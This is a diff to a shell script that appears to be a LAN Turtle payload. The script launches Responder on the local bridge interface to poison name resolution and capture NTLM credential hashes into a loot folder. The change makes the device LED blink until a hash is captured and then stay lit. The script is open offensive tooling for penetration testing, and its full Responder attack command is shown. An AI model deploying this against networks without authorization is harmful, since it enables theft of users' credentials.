@@ -114,14 +114,10 @@ ln -s /root/loot/$(printf "%04u" $newdir) /etc/turtle/Responder/logs
 # Execute attack
 screen -dmS responder bash -c 'cd /etc/turtle/Responder; python Responder.py -I br-lan -f -w -r -d -F'
 
-# Blink upon hash capture
+# Blink until hash capture
 while true; do
-if [ -e /etc/turtle/Responder/logs/*NTLM* ];
-  then 
-    if [[ ! $(cat /root/loot/responder.log | tail -n1) == *"Creds"* ]]
-    then
-      echo "Creds saved!" >> /root/loot/responder.log
-    fi
+if [ ! -f /etc/turtle/Responder/logs/*NTLM* ];
+  then
     echo 255 > /sys/class/leds/turtle\:yellow\:system/brightness
     /usr/bin/sleep 0.05
     echo 0 > /sys/class/leds/turtle\:yellow\:system/brightness
@@ -134,6 +130,13 @@ if [ -e /etc/turtle/Responder/logs/*NTLM* ];
     /usr/bin/sleep 0.05
     echo 0 > /sys/class/leds/turtle\:yellow\:system/brightness
     /usr/bin/sleep 0.6
+  else
+    if [[ ! $(cat /root/loot/responder.log | tail -n1) == *"Creds"* ]]
+    then
+      echo "Creds saved!" >> /root/loot/responder.log
+      echo 255 > /sys/class/leds/turtle\:yellow\:system/brightness
+      break	
+    fi
   fi
 sleep 1
 done
